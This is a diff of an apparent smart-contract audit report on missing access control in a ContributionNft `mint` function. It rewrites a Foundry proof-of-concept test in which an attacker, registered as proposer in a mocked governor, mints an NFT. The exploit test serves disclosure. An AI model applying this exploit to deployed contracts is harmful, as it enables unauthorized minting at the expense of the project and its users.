@@ -8,7 +8,7 @@ The `mint` function is `external` and intended to mint Contribution NFTs tied to
 
 Root Cause: The absence of a robust access control mechanism in the `mint` function, combined with reliance on an external `IGovernor` contract, allows unauthorized calls. 
 
-```js
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
@@ -225,13 +225,17 @@ Impact
 Proof of Concept (PoC)
 The following Foundry test demonstrates how an attacker can mint an NFT by exploiting a misconfigured ``IGovernor`` contract:
 
-```js
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
 import "forge-std/Test.sol";
-import "../ContributionNft.sol";
+import "../contracts/contribution/ContributionNft.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import "../contracts/virtualPersona/IAgentNft.sol";
+
+
 
 interface IGovernorMock {
     function proposalProposer(uint256 proposalId) external view returns (address);
@@ -252,15 +256,33 @@ contract ContributionNftTest is Test {
 
     function setUp() public {
         governor = new GovernorMock(attacker); // Attacker is proposer
+
+        // Deploy the implementation contract
+        ContributionNft implementation = new ContributionNft();
+
+        // Deploy a proxy and initialize it
         vm.prank(admin);
-        nft = new ContributionNft();
-        vm.prank(admin);
-        nft.initialize(personaNft);
+        ERC1967Proxy proxy = new ERC1967Proxy(
+            address(implementation),
+            abi.encodeWithSelector(ContributionNft.initialize.selector, personaNft)
+        );
+
+        // Cast the proxy to ContributionNft
+        nft = ContributionNft(address(proxy));
+
         // Mock personaNft to return governor as DAO
+        uint8[] memory coreTypes = new uint8[](1);
+        coreTypes[0] = 1;
         vm.mockCall(
             personaNft,
             abi.encodeWithSelector(IAgentNft.virtualInfo.selector, 1),
-            abi.encode(IAgentNft.VirtualInfo(address(governor), 0))
+            abi.encode(IAgentNft.VirtualInfo(
+                address(governor), // dao
+                address(0),       // token
+                address(0),       // founder
+                address(0),       // tba
+                coreTypes         // coreTypes
+            ))
         );
     }
 
@@ -268,13 +290,13 @@ contract ContributionNftTest is Test {
         vm.prank(attacker);
         uint256 tokenId = nft.mint(
             attacker, // to
-            1, // virtualId
-            1, // coreId
+            1,        // virtualId
+            1,        // coreId
             "ipfs://metadata", // newTokenURI
-            123, // proposalId
-            0, // parentId
-            true, // isModel
-            456 // datasetId
+            123,      // proposalId
+            0,        // parentId
+            true,     // isModel
+            456       // datasetId
         );
 
         assertEq(nft.ownerOf(tokenId), attacker, "Attacker minted NFT");
@@ -286,7 +308,7 @@ contract ContributionNftTest is Test {
 
 Execution:
 
-. Run forge test ```--match-path test/ContributionNftTest.sol.```
+. Run forge test ```forge test --match-path test/ContributionNftTest.sol --via-ir```
 
 .The test shows an attacker minting an NFT by being the proposer in a mock IGovernor, bypassing intended restrictions.
 
